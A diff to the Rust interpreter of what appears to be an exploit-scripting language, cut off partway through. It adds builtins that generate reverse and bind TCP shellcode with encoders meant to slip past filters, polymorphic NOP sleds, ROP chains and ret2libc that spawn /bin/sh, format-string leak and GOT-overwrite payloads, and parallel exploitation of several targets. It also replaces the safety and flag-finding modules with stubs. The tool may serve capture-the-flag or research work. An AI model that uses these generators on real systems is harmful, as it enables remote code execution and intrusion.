@@ -20,9 +20,78 @@ use crate::ast::{
     FunctionDef, MatchBlock, TryCatch, MacroDef,
 };
 use crate::parser::parse_script;
-use crate::runtime_safety::{RuntimeSafety, SafetyConfig};
-use crate::ctf_helpers::FlagFinder;
+// use crate::runtime_safety::{RuntimeSafety, SafetyConfig};
+// use crate::ctf_helpers::FlagFinder;
 use crate::interactive_io::{Socket, Process};
+
+#[derive(Debug, Clone)]
+struct SafetyConfig {
+    buffer_overflow: bool,
+    integer_overflow: bool,
+    overflow_checking: bool,
+    strict_mode: bool,
+    type_checking: bool,
+    bounds_checking: bool,
+    max_execution_time_ms: u64,
+    max_memory_bytes: u64,
+    max_recursion_depth: usize,
+}
+
+impl Default for SafetyConfig {
+    fn default() -> Self {
+        SafetyConfig {
+            buffer_overflow: true,
+            integer_overflow: true,
+            overflow_checking: true,
+            strict_mode: true,
+            type_checking: true,
+            bounds_checking: true,
+            max_execution_time_ms: 60000,
+            max_memory_bytes: 1024 * 1024 * 1024,
+            max_recursion_depth: 100,
+        }
+    }
+}
+
+#[derive(Debug)]
+struct RuntimeSafety {
+    config: SafetyConfig,
+}
+
+impl RuntimeSafety {
+    fn new(config: SafetyConfig) -> Self {
+        RuntimeSafety { config }
+    }
+    
+    fn get_stats(&self) -> SafetyStats {
+        SafetyStats { config: self.config.clone(), warnings: Vec::new() }
+    }
+    
+    fn update_config(&mut self, config: SafetyConfig) {
+        self.config = config;
+    }
+}
+
+#[derive(Debug)]
+struct SafetyStats {
+    config: SafetyConfig,
+    warnings: Vec<String>,
+}
+
+impl std::fmt::Display for SafetyStats {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "SafetyStats {{ buffer_overflow: {}, integer_overflow: {}, warnings: {} }}", 
+            self.config.buffer_overflow, self.config.integer_overflow, self.warnings.len())
+    }
+}
+
+struct FlagFinder;
+
+impl FlagFinder {
+    fn find_in_text(_text: &str) -> Vec<String> {
+        Vec::new()
+    }
+}
 
 // Global connection storage
 type ConnectionId = u64;
@@ -1363,7 +1432,7 @@ fn interpret_with_scope<'a>(
             
             Command::SetMemoryLimit { megabytes } => {
                 let mut config = safety.read().await.get_stats().config;
-                config.max_memory_bytes = megabytes * 1024 * 1024;
+                config.max_memory_bytes = (*megabytes as u64) * 1024 * 1024;
                 safety.write().await.update_config(config);
                 println!("[SAFETY] Memory limit set to {}MB", megabytes);
             }
@@ -1423,9 +1492,9 @@ fn interpret_with_scope<'a>(
                 use crate::ai_exploit_gen::{generate_exploit_ai, AIConfig};
                 use colored::*;
                 
-                println!("{} Generating exploit for {}", "[AI]".cyan(), binary.yellow());
-                println!("{} Vulnerability: {}", "  ".bright_black(), vuln_type.green());
-                println!("{} Architecture: {}\n", "  ".bright_black(), arch.cyan());
+                println!("{} Generating exploit for {}", "[AI]".to_string().cyan(), binary.to_string().yellow());
+                println!("{} Vulnerability: {}", "  ".to_string().bright_black(), vuln_type.to_string().green());
+                println!("{} Architecture: {}\n", "  ".to_string().bright_black(), arch.to_string().cyan());
                 
                 let config = AIConfig::default();
                 match generate_exploit_ai(binary, vuln_type, arch, Some(config)) {
@@ -1445,7 +1514,7 @@ fn interpret_with_scope<'a>(
                                 println!("{}", "WARNINGS".red().bold());
                                 println!("{}", "═".repeat(60).bright_black());
                                 for warning in response.warnings {
-                                    println!("{} {}", "WARNING:".yellow(), warning.yellow());
+                                    println!("{} {}", "WARNING:".to_string().yellow(), warning.to_string().yellow());
                                 }
                                 println!();
                             }
@@ -1473,7 +1542,7 @@ fn interpret_with_scope<'a>(
                 println!("[SYMBIOTIC] Synchronizing all symlinks");
             }
             
-            Command::Achieve { goal, address, value, constraints, primitives } => {
+            Command::Achieve { goal, address: _, value: _, constraints, primitives } => {
                 println!("[GOAL-PLANNER] Synthesizing exploit for goal: {}", goal);
                 if !constraints.is_empty() {
                     println!("[GOAL-PLANNER]   Constraints: {:?}", constraints);
@@ -1483,7 +1552,7 @@ fn interpret_with_scope<'a>(
                 }
             }
             
-            Command::DefineStrategy { name, parameters, implementation } => {
+            Command::DefineStrategy { name, parameters, implementation: _ } => {
                 println!("[STRATEGY] Defining strategy: {} with {} parameters", name, parameters.len());
             }
             
@@ -1783,6 +1852,258 @@ fn eval_expr<'a>(
                     
                     Ok(Value::Bytes(shellcode))
                 }
+                "shellcode_gen" => {
+                    let arch_str = arg_map.get("arch")
+                        .or_else(|| arg_values.get(0))
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "x64".to_string());
+                    
+                    let payload_str = arg_map.get("payload")
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "execve_sh".to_string());
+                    
+                    let arch = crate::shellcode_library::parse_arch(&arch_str)
+                        .map_err(|e| format!("Invalid architecture: {}", e))?;
+                    
+                    let payload = crate::shellcode_library::parse_payload(&payload_str)
+                        .map_err(|e| format!("Invalid payload: {}", e))?;
+                    
+                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
+                    
+                    let mut params_map = HashMap::new();
+                    if let Some(lhost) = arg_map.get("lhost") {
+                        params_map.insert("lhost".to_string(), lhost.to_string());
+                    }
+                    if let Some(lport) = arg_map.get("lport") {
+                        params_map.insert("lport".to_string(), lport.to_string());
+                    }
+                    
+                    let mut shellcode = lib.get_with_params(arch, payload, &params_map)
+                        .map_err(|e| format!("Failed to generate shellcode: {}", e))?;
+                    
+                    // Apply encoding if requested
+                    if let Some(encoder) = arg_map.get("encoder").map(|v| v.to_string()) {
+                        use crate::shellcode_encoders::ShellcodeEncoder;
+                        let enc = ShellcodeEncoder::new(shellcode.clone());
+                        
+                        shellcode = match encoder.as_str() {
+                            "xor" => {
+                                let key = if let Some(Value::Number(k)) = arg_map.get("key") {
+                                    *k as u8
+                                } else {
+                                    enc.find_xor_key().unwrap_or(0x42)
+                                };
+                                enc.xor_encode(key).unwrap_or(shellcode)
+                            }
+                            "alphanumeric" | "alnum" => {
+                                enc.alphanumeric_encode().unwrap_or(shellcode)
+                            }
+                            "unicode" => {
+                                enc.unicode_encode()
+                            }
+                            "base64" => {
+                                enc.base64_encode().into_bytes()
+                            }
+                            "url" => {
+                                enc.url_encode().into_bytes()
+                            }
+                            _ => shellcode,
+                        };
+                    }
+                    
+                    // Add NOP sled if requested
+                    if let Some(Value::Number(nop_size)) = arg_map.get("nop_sled") {
+                        let nops = vec![0x90; *nop_size as usize];
+                        shellcode = [nops, shellcode].concat();
+                    }
+                    
+                    use colored::Colorize;
+                    println!("{} Generated {} shellcode ({} bytes)", 
+                        "[SHELLCODE]".to_string().cyan(), 
+                        payload_str.to_string().yellow(), 
+                        shellcode.len().to_string().green());
+                    
+                    Ok(Value::Bytes(shellcode))
+                }
+                "shellcode_encode" => {
+                    if arg_values.is_empty() {
+                        return Err("shellcode_encode() requires shellcode bytes".to_string());
+                    }
+                    
+                    let shellcode = if let Value::Bytes(bytes) = &arg_values[0] {
+                        bytes.clone()
+                    } else {
+                        return Err("shellcode_encode() requires bytes as first argument".to_string());
+                    };
+                    
+                    let encoder_type = arg_map.get("encoder")
+                        .or_else(|| arg_values.get(1))
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "xor".to_string());
+                    
+                    use crate::shellcode_encoders::ShellcodeEncoder;
+                    let mut encoder = ShellcodeEncoder::new(shellcode.clone());
+                    
+                    // Set bad chars if provided
+                    if let Some(Value::List(bad_chars_list)) = arg_map.get("bad_chars") {
+                        let bad_chars: Vec<u8> = bad_chars_list.iter()
+                            .filter_map(|v| {
+                                if let Value::Number(n) = v {
+                                    Some(*n as u8)
+                                } else {
+                                    None
+                                }
+                            })
+                            .collect();
+                        encoder.set_bad_chars(bad_chars);
+                    }
+                    
+                    let encoded = match encoder_type.as_str() {
+                        "xor" => {
+                            let key = if let Some(Value::Number(k)) = arg_map.get("key") {
+                                *k as u8
+                            } else {
+                                encoder.find_xor_key().ok_or("Failed to find valid XOR key")?
+                            };
+                            encoder.xor_encode(key)?
+                        }
+                        "alphanumeric" | "alnum" => encoder.alphanumeric_encode()?,
+                        "unicode" => encoder.unicode_encode(),
+                        "base64" => encoder.base64_encode().into_bytes(),
+                        "url" => encoder.url_encode().into_bytes(),
+                        "polymorphic" => {
+                            let density = if let Some(Value::Number(n)) = arg_map.get("density") {
+                                (*n as f64 / 100.0) as f32
+                            } else {
+                                0.3
+                            };
+                            crate::shellcode_encoders::polymorphic_encode(&shellcode, density)
+                        }
+                        _ => return Err(format!("Unknown encoder type: {}", encoder_type)),
+                    };
+                    
+                    use colored::Colorize;
+                    println!("{} Encoded shellcode using {} ({} → {} bytes)", 
+                        "[ENCODE]".to_string().cyan(), 
+                        encoder_type.to_string().yellow(), 
+                        shellcode.len().to_string().red(),
+                        encoded.len().to_string().green());
+                    
+                    Ok(Value::Bytes(encoded))
+                }
+                "shellcode_reverse_tcp" => {
+                    let lhost = arg_map.get("lhost")
+                        .or_else(|| arg_values.get(0))
+                        .map(|v| v.to_string())
+                        .ok_or("shellcode_reverse_tcp() requires lhost parameter")?;
+                    
+                    let lport = if let Some(Value::Number(p)) = arg_map.get("lport").or_else(|| arg_values.get(1)) {
+                        *p as u16
+                    } else {
+                        return Err("shellcode_reverse_tcp() requires lport parameter".to_string());
+                    };
+                    
+                    let arch_str = arg_map.get("arch")
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "x64".to_string());
+                    
+                    let arch = crate::shellcode_library::parse_arch(&arch_str)
+                        .map_err(|e| format!("Invalid architecture: {}", e))?;
+                    
+                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
+                    let mut params_map = HashMap::new();
+                    params_map.insert("lhost".to_string(), lhost.clone());
+                    params_map.insert("lport".to_string(), lport.to_string());
+                    
+                    let payload = crate::shellcode_library::Payload::ShellReverseTcp;
+                    let shellcode = lib.get_with_params(arch, payload, &params_map)
+                        .map_err(|e| format!("Failed to generate reverse TCP shellcode: {}", e))?;
+                    
+                    use colored::Colorize;
+                    println!("{} Reverse TCP shell: {}:{} ({} bytes)", 
+                        "[SHELLCODE]".to_string().cyan(), 
+                        lhost.to_string().yellow(), 
+                        lport.to_string().yellow(),
+                        shellcode.len().to_string().green());
+                    
+                    Ok(Value::Bytes(shellcode))
+                }
+                "shellcode_bind_tcp" => {
+                    let lport = if let Some(Value::Number(p)) = arg_map.get("lport").or_else(|| arg_values.get(0)) {
+                        *p as u16
+                    } else {
+                        return Err("shellcode_bind_tcp() requires lport parameter".to_string());
+                    };
+                    
+                    let arch_str = arg_map.get("arch")
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "x64".to_string());
+                    
+                    let arch = crate::shellcode_library::parse_arch(&arch_str)
+                        .map_err(|e| format!("Invalid architecture: {}", e))?;
+                    
+                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
+                    let mut params_map = HashMap::new();
+                    params_map.insert("lport".to_string(), lport.to_string());
+                    
+                    let payload = crate::shellcode_library::Payload::ShellBindTcp;
+                    let shellcode = lib.get_with_params(arch, payload, &params_map)
+                        .map_err(|e| format!("Failed to generate bind TCP shellcode: {}", e))?;
+                    
+                    use colored::Colorize;
+                    println!("{} Bind TCP shell on port {} ({} bytes)", 
+                        "[SHELLCODE]".to_string().cyan(), 
+                        lport.to_string().yellow(),
+                        shellcode.len().to_string().green());
+                    
+                    Ok(Value::Bytes(shellcode))
+                }
+                "nop_sled" => {
+                    let size = if let Some(Value::Number(s)) = arg_values.get(0) {
+                        *s as usize
+                    } else {
+                        return Err("nop_sled() requires size argument".to_string());
+                    };
+                    
+                    let polymorphic = arg_map.get("polymorphic")
+                        .map(|v| v.to_string())
+                        .map(|s| s == "true" || s == "1")
+                        .unwrap_or(false);
+                    
+                    use crate::shellcode_encoders;
+                    let nops = if polymorphic {
+                        shellcode_encoders::polymorphic_nop_sled(size)
+                    } else {
+                        shellcode_encoders::nop_sled(size)
+                    };
+                    
+                    use colored::Colorize;
+                    let mode_str = if polymorphic { "polymorphic".to_string().yellow() } else { "static".to_string().white() };
+                    println!("{} NOP sled: {} bytes ({})", 
+                        "[NOP]".to_string().cyan(), 
+                        size.to_string().green(),
+                        mode_str);
+                    
+                    Ok(Value::Bytes(nops))
+                }
+                "shellcode_list" => {
+                    use crate::shellcode_db;
+                    let db = shellcode_db::get_shellcode_db();
+                    let all = db.list();
+                    
+                    use colored::Colorize;
+                    println!("{} Available shellcodes:", "[SHELLCODE]".to_string().cyan());
+                    println!();
+                    for entry in all {
+                        println!("  {} - {} ({} bytes, {})",
+                            entry.name.to_string().cyan(),
+                            entry.description.to_string().white(),
+                            entry.bytes.len().to_string().green(),
+                            format!("{:?}", entry.arch).to_string().blue());
+                    }
+                    
+                    Ok(Value::Null)
+                }
                 "rop_find" => {
                     if arg_values.is_empty() {
                         return Err("rop_find() requires binary path argument".to_string());
@@ -1812,6 +2133,253 @@ fn eval_expr<'a>(
                             .collect();
                         Ok(Value::List(addresses))
                     }
+                }
+                "rop_new" => {
+                    if arg_values.is_empty() {
+                        return Err("rop_new() requires binary path argument".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    
+                    let chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    
+                    use colored::Colorize;
+                    println!("{} ROP chain initialized", "[ROP]".cyan());
+                    println!("  Binary: {}", binary.yellow());
+                    println!("  Gadgets found: {}", chain.gadgets.len().to_string().green());
+                    println!("  Architecture: {:?}", chain.arch);
+                    
+                    Ok(Value::String(format!("RopChain[{}]", binary)))
+                }
+                "rop_set_libc" => {
+                    if arg_values.len() < 2 {
+                        return Err("rop_set_libc() requires binary path and libc base address".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    let base = if let Value::Number(n) = &arg_values[1] {
+                        *n as u64
+                    } else {
+                        return Err("rop_set_libc() requires numeric libc base address".to_string());
+                    };
+                    
+                    let mut chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    chain.set_libc_base(base);
+                    
+                    use colored::Colorize;
+                    println!("{} libc base set to 0x{:x}", "[ROP]".cyan(), base);
+                    Ok(Value::Null)
+                }
+                "rop_find_gadget" => {
+                    if arg_values.len() < 2 {
+                        return Err("rop_find_gadget() requires binary path and pattern".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    let pattern = arg_values[1].to_string();
+                    
+                    let chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    
+                    if let Some(addr) = chain.find_gadget(&pattern) {
+                        use colored::Colorize;
+                        println!("{} Gadget found: {} @ 0x{:016x}", "[ROP]".cyan(), pattern.yellow(), addr);
+                        Ok(Value::Number(addr as i64))
+                    } else {
+                        Err(format!("Gadget not found: {}", pattern))
+                    }
+                }
+                "rop_find_gadgets" => {
+                    if arg_values.len() < 2 {
+                        return Err("rop_find_gadgets() requires binary path and pattern".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    let pattern = arg_values[1].to_string();
+                    
+                    let chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    
+                    let gadgets = chain.find_gadgets(&pattern);
+                    use colored::Colorize;
+                    println!("{} Found {} gadgets matching '{}'", "[ROP]".cyan(), gadgets.len().to_string().green(), pattern.yellow());
+                    
+                    let addresses: Vec<Value> = gadgets.iter()
+                        .map(|g| Value::Number(g.address as i64))
+                        .collect();
+                    Ok(Value::List(addresses))
+                }
+                "rop_build_chain" => {
+                    if arg_values.len() < 2 {
+                        return Err("rop_build_chain() requires binary path and address list".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    
+                    let addresses: Vec<u64> = if let Value::List(list) = &arg_values[1] {
+                        list.iter()
+                            .map(|v| match v {
+                                Value::Number(n) => *n as u64,
+                                _ => 0,
+                            })
+                            .collect()
+                    } else {
+                        return Err("rop_build_chain() requires list of addresses".to_string());
+                    };
+                    
+                    let chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    
+                    let chain_bytes = chain.build_chain(&addresses);
+                    use colored::Colorize;
+                    println!("{} ROP chain built: {} gadgets, {} bytes", 
+                        "[ROP]".cyan(), 
+                        addresses.len().to_string().green(), 
+                        chain_bytes.len().to_string().yellow());
+                    
+                    Ok(Value::Bytes(chain_bytes))
+                }
+                "rop_ret2libc" => {
+                    if arg_values.len() < 2 {
+                        return Err("rop_ret2libc() requires binary path and command".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    let cmd = arg_values[1].to_string();
+                    
+                    let mut chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    
+                    if let Some(Value::Number(base)) = arg_map.get("libc_base") {
+                        chain.set_libc_base(*base as u64);
+                    }
+                    
+                    let addresses = chain.ret2libc(&cmd)
+                        .map_err(|e| format!("ret2libc failed: {}", e))?;
+                    
+                    use colored::Colorize;
+                    println!("{} ret2libc chain created", "[ROP]".cyan());
+                    println!("  Command: {}", cmd.yellow());
+                    println!("  Chain length: {} gadgets", addresses.len().to_string().green());
+                    
+                    let chain_bytes = chain.build_chain(&addresses);
+                    Ok(Value::Bytes(chain_bytes))
+                }
+                "rop_ret2syscall" => {
+                    return Err("rop_ret2syscall() not yet implemented - use rop_solve() with 'syscall' goal instead".to_string());
+                }
+                "rop_solve" => {
+                    use crate::rop_tools::{AutoROPSolver, ROPGoal, ROPStrategy};
+                    
+                    if arg_values.len() < 2 {
+                        return Err("rop_solve() requires binary path and goal type".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    let goal_type = arg_values[1].to_string();
+                    
+                    let mut solver = AutoROPSolver::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP solver: {}", e))?;
+                    
+                    if let Some(Value::Number(base)) = arg_map.get("libc_base") {
+                        solver.libc_base = Some(*base as u64);
+                    }
+                    
+                    let goal = match goal_type.as_str() {
+                        "system" => {
+                            let cmd = arg_map.get("cmd")
+                                .or_else(|| arg_values.get(2))
+                                .map(|v| v.to_string())
+                                .unwrap_or_else(|| "/bin/sh".to_string());
+                            ROPGoal::System(cmd)
+                        }
+                        "execve" => {
+                            let cmd = arg_map.get("cmd")
+                                .or_else(|| arg_values.get(2))
+                                .map(|v| v.to_string())
+                                .unwrap_or_else(|| "/bin/sh".to_string());
+                            ROPGoal::Execve(cmd, vec![])
+                        }
+                        "mprotect" => {
+                            let addr = if let Some(Value::Number(n)) = arg_map.get("addr") { *n as u64 } else { 0x600000 };
+                            let size = if let Some(Value::Number(n)) = arg_map.get("size") { *n as u64 } else { 0x1000 };
+                            let perms = if let Some(Value::Number(n)) = arg_map.get("perms") { *n as u64 } else { 7 };
+                            ROPGoal::Mprotect(addr, size as usize, perms as u32)
+                        }
+                        _ => return Err(format!("Unknown goal type: {}", goal_type)),
+                    };
+                    
+                    let strategies = if let Some(Value::List(strats)) = arg_map.get("strategies") {
+                        strats.iter()
+                            .filter_map(|v| {
+                                match v.to_string().as_str() {
+                                    "one_gadget" => Some(ROPStrategy::OneGadget),
+                                    "ret2libc" => Some(ROPStrategy::Ret2Libc),
+                                    "mprotect_rwx" => Some(ROPStrategy::MprotectRWX),
+                                    "ret2syscall" => Some(ROPStrategy::Ret2Syscall),
+                                    "srop" => Some(ROPStrategy::SROP),
+                                    "jop" => Some(ROPStrategy::JOP),
+                                    "cop" => Some(ROPStrategy::COP),
+                                    "stack_pivot" => Some(ROPStrategy::StackPivot),
+                                    _ => None,
+                                }
+                            })
+                            .collect()
+                    } else {
+                        vec![ROPStrategy::Ret2Libc, ROPStrategy::Ret2Syscall]
+                    };
+                    
+                    let solution = solver.solve(goal, strategies)
+                        .map_err(|e| format!("ROP solver failed: {}", e))?;
+                    
+                    use colored::Colorize;
+                    println!("{} ROP solution found!", "[SOLVER]".cyan().bold());
+                    println!("  Strategy: {}", solution.strategy.green());
+                    println!("  Gadgets used: {}", solution.gadgets_used.len().to_string().yellow());
+                    println!("  Payload size: {} bytes", solution.chain_bytes.len().to_string().yellow());
+                    println!("  Success probability: {:.1}%", (solution.success_probability * 100.0).to_string().green());
+                    
+                    Ok(Value::Bytes(solution.chain_bytes))
+                }
+                "rop_list_gadgets" => {
+                    if arg_values.is_empty() {
+                        return Err("rop_list_gadgets() requires binary path".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    
+                    let chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    
+                    crate::rop_tools::list_common_gadgets(&chain);
+                    Ok(Value::Null)
+                }
+                "rop_search" => {
+                    if arg_values.len() < 2 {
+                        return Err("rop_search() requires binary path and instruction pattern".to_string());
+                    }
+                    let binary = arg_values[0].to_string();
+                    let pattern = arg_values[1].to_string();
+                    
+                    let chain = crate::rop_tools::RopChain::new(&binary)
+                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
+                    
+                    let gadgets = chain.find_gadgets(&pattern);
+                    
+                    use colored::Colorize;
+                    println!("{} ROP Gadget Search Results", "[ROP]".cyan().bold());
+                    println!("  Pattern: {}", pattern.yellow());
+                    println!("  Found: {} gadgets\n", gadgets.len().to_string().green());
+                    
+                    for (i, gadget) in gadgets.iter().take(20).enumerate() {
+                        println!("  {}. 0x{:016x}: {}", 
+                            i + 1, 
+                            gadget.address, 
+                            gadget.instructions.join("; ").cyan());
+                    }
+                    
+                    if gadgets.len() > 20 {
+                        println!("\n  ... and {} more", gadgets.len() - 20);
+                    }
+                    
+                    let addresses: Vec<Value> = gadgets.iter()
+                        .map(|g| Value::Number(g.address as i64))
+                        .collect();
+                    Ok(Value::List(addresses))
                 }
                 "fmtstr_payload" => {
                     let offset = if let Some(Value::Number(off)) = arg_map.get("offset").or_else(|| arg_values.get(0)) {
@@ -1846,6 +2414,177 @@ fn eval_expr<'a>(
                         .map_err(|e| format!("Failed to generate format string payload: {}", e))?;
                     
                     Ok(Value::Bytes(payload))
+                }
+                "fmtstr_leak" => {
+                    let offset = if let Some(Value::Number(off)) = arg_map.get("offset").or_else(|| arg_values.get(0)) {
+                        *off as usize
+                    } else {
+                        return Err("fmtstr_leak() requires offset argument".to_string());
+                    };
+                    
+                    let payload = crate::fmtstr_tools::fmtstr_leak(offset);
+                    
+                    use colored::Colorize;
+                    println!("{} Leak payload for offset {}: {}", 
+                        "[FMTSTR]".cyan(), 
+                        offset.to_string().yellow(),
+                        payload.green());
+                    
+                    Ok(Value::String(payload))
+                }
+                "fmtstr_leak_stack" => {
+                    let start = if let Some(Value::Number(s)) = arg_map.get("start").or_else(|| arg_values.get(0)) {
+                        *s as usize
+                    } else {
+                        return Err("fmtstr_leak_stack() requires start offset".to_string());
+                    };
+                    
+                    let count = if let Some(Value::Number(c)) = arg_map.get("count").or_else(|| arg_values.get(1)) {
+                        *c as usize
+                    } else {
+                        10
+                    };
+                    
+                    let payload = crate::fmtstr_tools::fmtstr_leak_stack(start, count);
+                    
+                    use colored::Colorize;
+                    println!("{} Stack leak payload: offsets {} to {}", 
+                        "[FMTSTR]".cyan(), 
+                        start.to_string().yellow(),
+                        (start + count - 1).to_string().yellow());
+                    
+                    Ok(Value::String(payload))
+                }
+                "fmtstr_write" => {
+                    let address = if let Some(Value::Number(addr)) = arg_map.get("address").or_else(|| arg_values.get(0)) {
+                        *addr as u64
+                    } else {
+                        return Err("fmtstr_write() requires address argument".to_string());
+                    };
+                    
+                    let value = if let Some(Value::Number(val)) = arg_map.get("value").or_else(|| arg_values.get(1)) {
+                        *val as u64
+                    } else {
+                        return Err("fmtstr_write() requires value argument".to_string());
+                    };
+                    
+                    let offset = if let Some(Value::Number(off)) = arg_map.get("offset").or_else(|| arg_values.get(2)) {
+                        *off as usize
+                    } else {
+                        return Err("fmtstr_write() requires offset argument".to_string());
+                    };
+                    
+                    let payload = crate::fmtstr_tools::fmtstr_write(address, value, offset);
+                    
+                    use colored::Colorize;
+                    println!("{} Write payload: 0x{:x} = 0x{:x} (offset {})", 
+                        "[FMTSTR]".cyan(), 
+                        address,
+                        value,
+                        offset.to_string().yellow());
+                    
+                    Ok(Value::Bytes(payload))
+                }
+                "fmtstr_got_overwrite" => {
+                    let got_entry = if let Some(Value::Number(got)) = arg_map.get("got").or_else(|| arg_values.get(0)) {
+                        *got as u64
+                    } else {
+                        return Err("fmtstr_got_overwrite() requires GOT entry address".to_string());
+                    };
+                    
+                    let target = if let Some(Value::Number(t)) = arg_map.get("target").or_else(|| arg_values.get(1)) {
+                        *t as u64
+                    } else {
+                        return Err("fmtstr_got_overwrite() requires target address".to_string());
+                    };
+                    
+                    let offset = if let Some(Value::Number(off)) = arg_map.get("offset").or_else(|| arg_values.get(2)) {
+                        *off as usize
+                    } else {
+                        return Err("fmtstr_got_overwrite() requires offset argument".to_string());
+                    };
+                    
+                    let payload = crate::fmtstr_tools::fmtstr_write(got_entry, target, offset);
+                    
+                    use colored::Colorize;
+                    println!("{} GOT overwrite payload:", "[FMTSTR]".cyan());
+                    println!("  GOT[0x{:x}] → 0x{:x}", got_entry, target);
+                    println!("  Payload size: {} bytes", payload.len().to_string().green());
+                    
+                    Ok(Value::Bytes(payload))
+                }
+                "fmtstr_find_offset" => {
+                    let pattern = arg_map.get("pattern")
+                        .or_else(|| arg_values.get(0))
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "AAAA".to_string());
+                    
+                    let max_offset = if let Some(Value::Number(m)) = arg_map.get("max") {
+                        *m as usize
+                    } else {
+                        50
+                    };
+                    
+                    use colored::Colorize;
+                    println!("{} Finding format string offset...", "[FMTSTR]".cyan());
+                    println!("  Pattern: {}", pattern.yellow());
+                    println!("  Testing offsets 1 to {}", max_offset.to_string().yellow());
+                    println!();
+                    println!("  Send this payload and look for your pattern:");
+                    println!("  {}", format!("{}{}", pattern, ".%p".repeat(max_offset)).green());
+                    println!();
+                    println!("  Then use cyclic_find() to determine the offset");
+                    
+                    Ok(Value::String(format!("{}{}", pattern, ".%p".repeat(max_offset))))
+                }
+                "fmtstr_dump" => {
+                    let start_offset = if let Some(Value::Number(s)) = arg_map.get("start").or_else(|| arg_values.get(0)) {
+                        *s as usize
+                    } else {
+                        1
+                    };
+                    
+                    let count = if let Some(Value::Number(c)) = arg_map.get("count").or_else(|| arg_values.get(1)) {
+                        *c as usize
+                    } else {
+                        20
+                    };
+                    
+                    let mut payload = String::new();
+                    for offset in start_offset..(start_offset + count) {
+                        payload.push_str(&format!("[{}] %{}$p ", offset, offset));
+                    }
+                    
+                    use colored::Colorize;
+                    println!("{} Memory dump payload: {} offsets", 
+                        "[FMTSTR]".cyan(), 
+                        count.to_string().yellow());
+                    
+                    Ok(Value::String(payload))
+                }
+                "fmtstr_analyze" => {
+                    let binary = arg_map.get("binary")
+                        .or_else(|| arg_values.get(0))
+                        .map(|v| v.to_string())
+                        .ok_or("fmtstr_analyze() requires binary path")?;
+                    
+                    use colored::Colorize;
+                    println!("{} Analyzing {} for format string vulnerabilities", 
+                        "[FMTSTR]".cyan(), 
+                        binary.yellow());
+                    println!();
+                    println!("  {}:", "Dangerous functions".yellow());
+                    println!("    • printf, fprintf, sprintf, snprintf");
+                    println!("    • vprintf, vfprintf, vsprintf, vsnprintf");
+                    println!("    • syslog");
+                    println!();
+                    println!("  {}:", "Recommended approach".yellow());
+                    println!("    1. Find the format string offset (fmtstr_find_offset)");
+                    println!("    2. Leak addresses (fmtstr_leak, fmtstr_leak_stack)");
+                    println!("    3. Overwrite GOT entries (fmtstr_got_overwrite)");
+                    println!("    4. Chain to shellcode or ROP");
+                    
+                    Ok(Value::Null)
                 }
                 "interactive" => {
                     if arg_values.is_empty() {
@@ -1930,7 +2669,7 @@ fn eval_expr<'a>(
                         _ => return Err("parallel_exploit() requires bytes or string payload".to_string()),
                     };
                     
-                    let results = exploit_parallel(targets, payload_bytes).await
+                    let results: Vec<crate::parallel_exploit::ExploitResult> = exploit_parallel(targets, payload_bytes).await
                         .map_err(|e| format!("Parallel exploitation failed: {}", e))?;
                     
                     let success_count = results.iter().filter(|r| r.success).count();
@@ -1959,7 +2698,7 @@ fn eval_expr<'a>(
                         .map(|v| v.to_string())
                         .unwrap_or_else(|| "x64".to_string());
                     
-                    println!("{} Generating exploit for {}", "🤖".cyan(), binary.yellow());
+                    println!("{} Generating exploit for {}", "🤖".to_string().cyan(), binary.to_string().yellow());
                     
                     let config = AIConfig::default();
                     match generate_exploit_ai(&binary, &vuln_type, &arch, Some(config)) {
@@ -1989,7 +2728,7 @@ fn eval_expr<'a>(
                         println!("  {} - Search for functions", "help(search: \"keyword\")".green());
                         println!("\n{}", "Available modules:".yellow().bold());
                         for module in doc_gen.list_modules() {
-                            println!("  {} {}", "•".cyan(), module.magenta());
+                            println!("  {} {}", "•".to_string().cyan(), module.to_string().magenta());
                         }
                         println!("\n{}", "Examples:".yellow().bold());
                         println!("  {} - View cyclic function docs", "help(\"cyclic\")".cyan());
@@ -2078,6 +2817,154 @@ fn eval_expr<'a>(
                     use crate::packing_tools::unpack16;
                     let value = unpack16(&bytes)?;
                     Ok(Value::Number(value as i64))
+                }
+                "flat" | "flat_pack" => {
+                    if arg_values.is_empty() {
+                        return Err("flat() requires list argument".to_string());
+                    }
+                    let items = match &arg_values[0] {
+                        Value::List(items) => items,
+                        _ => return Err(format!("flat() requires list, got {:?}", arg_values[0])),
+                    };
+                    
+                    use crate::packing_tools::pack64;
+                    let mut result = Vec::new();
+                    for item in items {
+                        match item {
+                            Value::Number(n) => result.extend_from_slice(&pack64(*n as u64)),
+                            Value::Bytes(b) => result.extend_from_slice(b),
+                            Value::String(s) => result.extend_from_slice(s.as_bytes()),
